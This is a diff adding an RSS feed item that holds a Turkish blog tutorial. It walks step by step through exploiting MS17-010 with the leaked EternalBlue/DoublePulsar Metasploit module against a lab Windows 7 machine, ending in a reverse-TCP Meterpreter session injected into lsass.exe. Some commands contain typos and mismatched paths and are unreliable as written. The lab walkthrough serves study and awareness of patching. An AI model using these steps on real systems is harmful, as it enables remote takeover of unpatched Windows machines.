@@ -7,6 +7,98 @@
 		<atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>Metasploit Framework EternalBlue&Double Pulsar</title>
+				<description>&lt;h1 id=&quot;metasploit-framework-eternalbluedouble-pulsar&quot;&gt;Metasploit Framework EternalBlue&amp;amp;Double Pulsar&lt;/h1&gt;
+
+&lt;p&gt;Selamlar , bildiğiniz gibi nsa tarafından yazılan kullanılan araçlardan bazıları shadow brokers adlı grup tarafından yayınlandı.&lt;/p&gt;
+
+&lt;p&gt;Yayınlanan araçlardan fuzzbunch adındaki framework en fazla dikkat çeken araç oldu.&lt;/p&gt;
+
+&lt;p&gt;Özellikle doublepulsar backdooru ile birçok windows sürümlerine sızılabiliyor.&lt;/p&gt;
+
+&lt;p&gt;Bu zaafiyetlerden etkilenmemek için MS17-010 ile ilgili güncellemeleri yüklemelisiniz.&lt;/p&gt;
+
+&lt;p&gt;Sızdırılan exploitler kısa bir süre içinde engellendi fakat birçok github hesabı üzerinde bu toollara erişebilrisiniz.&lt;/p&gt;
+
+&lt;p&gt;Bir örnek:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/misterch0c/shadowbroker&quot;&gt;Nsa Shadow Brokers Tools&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Bu sızıntı hakkında birçok bilgi bulunnaktadır araştırmanızı öneririm. Ben kısaca doublepulsarın metasploit frameworkü üzerinde kullanılmasından bahsedicem.&lt;/p&gt;
+
+&lt;p&gt;Eternalblue&amp;amp;Doublepulsar kısaca smb üzerinden dll injection yaparak hedefe sızmayı sağlıyor. Fuzzbunch frameworku üzerinde kullanılıyor.&lt;/p&gt;
+
+&lt;p&gt;Araştırırken hep windows üzerinde fuzzbunch’ı kullanarak hedefe sızmaya çalıştığını gördüm. Fakat fuzzbunch’ı windows üzerinde çalıştırmayı denerken bazı bağımlılıkları yüklerken hatalarla karşılaştım. Daha sonra gördüm ki doublepulsarı metasploit üzerindede kullanabiliyormuşuz. Hem bu şekilde kullanım açısından daha kolay olur diye düşündüm.&lt;/p&gt;
+
+&lt;p&gt;Sırasıyla aşağıdaki komutları çalıştırıyoruz.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;dpkg –add-architecture i386 &amp;amp;&amp;amp; apt-get update &amp;amp;&amp;amp; apt-get install wine32&lt;br /&gt;
+rm -r ~/.wine&lt;br /&gt;
+wine cmd.exe&lt;br /&gt;
+exit&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Daha sonra &lt;a href=&quot;https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit&quot;&gt;https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit&lt;/a&gt; bu adresten metasploit için eternalblue&amp;amp;doublepulsar modünü indiriyoruz.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;İçerisinde bulunan &lt;u&gt;deps&lt;/u&gt; klasörü ile &lt;u&gt;eternalblue_doublepulsar.rb&lt;/u&gt; dosyasını kalide &lt;u&gt;/usr/share/metasploit-framework/modules/exploits/windows/smb/&lt;/u&gt; klasörü içersine kopyalıyoruz.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;service postgresql start - - - &amp;gt; Metasploit veritabanını güncelliyoruz. Artık msfconsole’a geçebiliriz.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ben Windows 7 Service Pack1 makinesine sızmayı deneyeceğim.&lt;/p&gt;
+
+&lt;p&gt;Windows 7 makinesini IP adresi &amp;gt; 172.16.72.129&lt;/p&gt;
+
+&lt;p&gt;Kali nin IP adresi &amp;gt; 172.16.72.128&lt;/p&gt;
+
+&lt;p&gt;Eternalblue modülünü kullanmak için msfconsole’de:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/windows/smb/eternalblue_doublepulsar
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/doublepulsar/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;show options ile set edebilceğimiz değerler:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/doublepulsar/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set DOUBLEPULSARPATH /usr/share/metasploit-framework/modules/exploits/smb/deps
+set ETERNALBLUEPATH /usr/share/metasploit-framework/modules/exploits/smb/deps
+set rhost 172.16.72.129
+set targetarchıtecture x64
+set payload windows/meterpreter/reverse_tcp
+set processşnject lsass.exe
+set lhost 172.16.72.128
+set target 9
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/doublepulsar/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Son olarak değerler:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/doublepulsar/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Daha sonra exploit diyerek hedef makineye sızma işlemini gerçekleştiriyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/doublepulsar/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+</description>
+				<pubDate>Tue, 02 May 2017 00:00:00 +0300</pubDate>
+				<link>http://localhost:4000/2017/05/MetasploitEternalBlueDoublePulsar</link>
+				<guid isPermaLink="true">http://localhost:4000/2017/05/MetasploitEternalBlueDoublePulsar</guid>
+			</item>
+		
+			<item>
 				<title>Tr0ll Vulnhub Writeup</title>
 				<description>&lt;h1 id=&quot;tr0ll-vulnhub&quot;&gt;Tr0ll Vulnhub&lt;/h1&gt;
 
